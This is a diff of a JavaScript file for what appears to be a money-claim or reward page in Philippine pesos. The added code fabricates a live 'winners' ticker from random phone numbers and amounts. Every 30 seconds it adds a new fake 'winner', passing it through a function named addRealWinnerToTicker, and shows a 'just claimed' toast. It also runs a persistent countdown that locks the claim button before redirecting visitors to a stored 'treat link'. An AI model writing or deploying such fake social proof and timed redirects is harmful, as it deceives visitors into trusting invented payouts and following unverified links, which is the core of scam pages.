@@ -459,7 +459,6 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
       amountSpan.classList.remove('increment', 'decrement');
     }, 700);
     
-    // Save balance to localStorage
     localStorage.setItem(STORAGE_KEYS.SELECTED_AMOUNT, String(newAmount));
   }
 
@@ -838,4 +837,240 @@ ${hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer started (v
     
     const claimSpan = document.createElement('span');
     claimSpan.className = 'ticker-claim';
-    claimSpan.textContent
+    claimSpan.textContent = 'has claimed';
+    
+    const amountSpan = document.createElement('span');
+    amountSpan.className = `ticker-amount ${amountData.class}`;
+    amountSpan.textContent = amountData.display;
+    
+    const separator = document.createElement('span');
+    separator.className = 'ticker-separator';
+    separator.textContent = '✦';
+    
+    item.appendChild(icon);
+    item.appendChild(phoneSpan);
+    item.appendChild(claimSpan);
+    item.appendChild(amountSpan);
+    item.appendChild(separator);
+    
+    return item;
+  }
+
+  function generateTickerWinners(count = 12) {
+    const winners = [];
+    const usedPhones = new Set();
+    
+    for (let i = 0; i < count; i++) {
+      let phone;
+      do {
+        phone = generateRandomPhone();
+      } while (usedPhones.has(phone));
+      usedPhones.add(phone);
+      
+      const amountData = generateRandomAmount();
+      winners.push({ phone, amountData });
+    }
+    
+    return winners;
+  }
+
+  function initWinnersTicker() {
+    const tickerTrack = document.getElementById('tickerTrack');
+    if (!tickerTrack) return;
+    
+    tickerTrack.innerHTML = '';
+    
+    const winners = generateTickerWinners(12);
+    const items = [];
+    winners.forEach(winner => {
+      const item = createTickerItem(winner.phone, winner.amountData);
+      items.push(item);
+    });
+    
+    items.forEach(item => {
+      const clone = item.cloneNode(true);
+      tickerTrack.appendChild(item);
+      tickerTrack.appendChild(clone);
+    });
+    
+    const tickerWrapper = document.getElementById('tickerWrapper');
+    if (tickerWrapper) {
+      tickerWrapper.addEventListener('mouseenter', function() {
+        tickerTrack.classList.add('paused');
+      });
+      tickerWrapper.addEventListener('mouseleave', function() {
+        tickerTrack.classList.remove('paused');
+      });
+    }
+  }
+
+  function addRealWinnerToTicker(phone, amount) {
+    const tickerTrack = document.getElementById('tickerTrack');
+    if (!tickerTrack) return;
+    
+    const amountData = {
+      amount: amount,
+      display: '₱' + formatWithCommas(amount),
+      class: amount >= 3000 ? 'rare' : 'common'
+    };
+    
+    const item = createTickerItem(phone, amountData);
+    tickerTrack.insertBefore(item, tickerTrack.firstChild);
+    
+    const items = tickerTrack.querySelectorAll('.ticker-item');
+    if (items.length > 30) {
+      tickerTrack.removeChild(items[items.length - 1]);
+    }
+    
+    showToast(`🎉 ${phone} just claimed ${amountData.display}!`);
+  }
+
+  function addRandomWinner() {
+    const phone = generateRandomPhone();
+    const amountData = generateRandomAmount();
+    addRealWinnerToTicker(phone, amountData.amount);
+  }
+
+  // ============================================================
+  // CHECK PERSISTENT TIMER ON LOAD
+  // ============================================================
+  function checkPersistentTimer() {
+    const timerData = localStorage.getItem('treat_timer');
+    if (!timerData) return false;
+    
+    try {
+      const data = JSON.parse(timerData);
+      const elapsed = Math.floor((Date.now() - data.startTime) / 1000);
+      const remaining = data.duration - elapsed;
+      
+      console.log('⏰ Persistent timer found:', { elapsed, remaining, duration: data.duration });
+      
+      if (remaining > 0) {
+        timeRemaining = remaining;
+        isTimerRunning = true;
+        selectedCard = data.selectedCard;
+        treatLink = data.treatLink;
+        
+        const cardNumber = parseInt(selectedCard.replace('card', ''));
+        if (cardNumber && cardData[cardNumber]) {
+          currentBalance = cardData[cardNumber].amount;
+          updateBalance(currentBalance, true);
+        }
+        
+        startTimerDisplay(remaining);
+        
+        if (data.pendingRedirect && data.treatLink) {
+          setTimeout(() => {
+            if (data.treatLink) {
+              window.location.href = data.treatLink;
+            }
+          }, 1000);
+        }
+        
+        return true;
+      } else {
+        localStorage.removeItem('treat_timer');
+        if (data.treatLink && data.pendingRedirect) {
+          window.location.href = data.treatLink;
+        }
+        return false;
+      }
+    } catch (e) {
+      console.error('Error parsing timer data:', e);
+      localStorage.removeItem('treat_timer');
+      return false;
+    }
+  }
+
+  function startTimerDisplay(seconds) {
+    const minutes = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    const timeStr = String(minutes).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+    
+    if (claimTimerDisplay) {
+      claimTimerDisplay.textContent = timeStr;
+    }
+    
+    claimPayBtn.classList.add('disabled');
+    claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">' + timeStr + '</span>';
+  }
+
+  function saveTimerState(duration, link, cardId) {
+    const timerData = {
+      startTime: Date.now(),
+      duration: duration,
+      selectedCard: cardId,
+      treatLink: link,
+      pendingRedirect: !!link
+    };
+    localStorage.setItem('treat_timer', JSON.stringify(timerData));
+    console.log('💾 Timer state saved:', timerData);
+  }
+
+  // ============================================================
+  // INITIALIZE
+  // ============================================================
+  
+  // Restore selected card first
+  const cardRestored = restoreSelectedCard();
+
+  // Initialize winners ticker
+  setTimeout(initWinnersTicker, 500);
+  
+  // Add random winner every 30 seconds
+  setInterval(addRandomWinner, 30000);
+
+  // Check for persistent timer
+  const hasActiveTimer = checkPersistentTimer();
+  
+  if (!hasActiveTimer) {
+    console.log('ℹ️ No active timer found');
+  }
+
+  // If no card restored and no timer, show default
+  if (!cardRestored && !hasActiveTimer) {
+    console.log('ℹ️ No card selected - showing default state');
+  }
+
+  // Make functions available globally
+  window.addRealWinnerToTicker = addRealWinnerToTicker;
+
+  // Add toast styles
+  const style = document.createElement('style');
+  style.textContent = `
+    .toast-message {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(3, 8, 7, 0.90);
+      backdrop-filter: blur(16px);
+      color: #fff;
+      padding: 0.8rem 1.8rem;
+      border-radius: 18px;
+      border: 1px solid rgba(0, 180, 255, 0.10);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.9rem;
+      font-weight: 500;
+      z-index: 9998;
+      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
+      animation: toastSlideUp 0.3s ease;
+      max-width: 85%;
+      text-align: center;
+    }
+    .toast-message.error {
+      border-color: rgba(255, 50, 50, 0.15);
+    }
+    @keyframes toastSlideUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+    @keyframes toastSlideDown {
+      from { opacity: 1; transform: translateX(-50%) translateY(0); }
+      to { opacity: 0; transform: translateX(-50%) translateY(20px); }
+    }
+  `;
+  document.head.appendChild(style);
+
+  console.log('✅ Main.js initialized successfully');
+})();
